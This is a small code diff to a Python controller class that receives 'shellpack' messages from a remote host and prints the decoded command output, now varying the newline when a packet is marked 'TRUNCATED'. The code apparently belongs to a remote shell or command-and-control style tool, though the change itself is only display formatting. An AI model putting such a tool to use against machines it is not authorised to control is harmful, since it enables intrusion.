@@ -49,7 +49,12 @@ class Controller(Host):
         # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
 
     def instruction(self, shellpack):
-        print(shellpack['data'].decode(), end="")
+        
+        if shellpack['option'] == "TRUNCATED":
+            print(shellpack['data'].decode(), end="")
+        else:
+            print(shellpack['data'].decode())
+        
 
 if __name__ == "__main__":
     controller = Controller()
